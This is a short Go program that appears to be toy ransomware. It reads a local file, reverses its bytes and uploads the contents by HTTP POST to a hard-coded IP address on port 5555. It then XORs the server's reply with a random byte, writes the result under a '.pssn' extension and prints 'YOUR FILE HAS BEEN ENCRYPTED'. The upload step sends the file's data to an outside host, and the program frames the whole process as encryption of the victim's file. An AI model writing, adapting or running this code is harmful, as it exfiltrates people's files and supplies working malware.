package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func a(x []byte) []byte {
	y := make([]byte, len(x))
	for i := 0; i < len(x); i++ {
		y[i] = x[len(x)-1-i]
	}
	return y
}

func b(x []byte) ([]byte, int, error) {
	n, e := rand.Int(rand.Reader, big.NewInt(256))
	if e != nil {
		return nil, 0, e
	}
	r := byte(n.Int64())
	for i := range x {
		x[i] ^= r
	}
	return x, int(r), nil
}

func c(p string, u string) ([]byte, error) {
	f, e := os.Open(p)
	if e != nil {
		return nil, e
	}
	defer f.Close()

	b := &bytes.Buffer{}
	w := multipart.NewWriter(b)
	d, e := w.CreateFormFile("file", filepath.Base(f.Name()))
	if e != nil {
		return nil, e
	}
	_, e = io.Copy(d, f)
	if e != nil {
		return nil, e
	}
	w.Close()

	r, e := http.NewRequest("POST", u, b)
	r.Header.Set("Content-Type", w.FormDataContentType())
	if e != nil {
		return nil, e
	}

	h := &http.Client{}
	res, e := h.Do(r)
	if e != nil {
		return nil, e
	}
	defer res.Body.Close()

	resData, e := ioutil.ReadAll(res.Body)
	if e != nil {
		return nil, e
	}

	return resData, nil
}

func main() {
	f := "filepenting"
	g := "temp"
	x, e := ioutil.ReadFile(f)

	t := a(x)
	e = ioutil.WriteFile(g, t, os.ModePerm)
	y, e := c(g, "http://203.194.112.225:5555/encrypt")
	e = os.Remove(g)

	z, n, e := b(y)
	if e != nil {
		log.Fatalf("Failed %v", e)
	}
	fmt.Printf("%d\n", n)

	e = ioutil.WriteFile(f+".pssn", z, 0644)

	fmt.Println("YOUR FILE HAS BEEN ENCRYPTED")
}
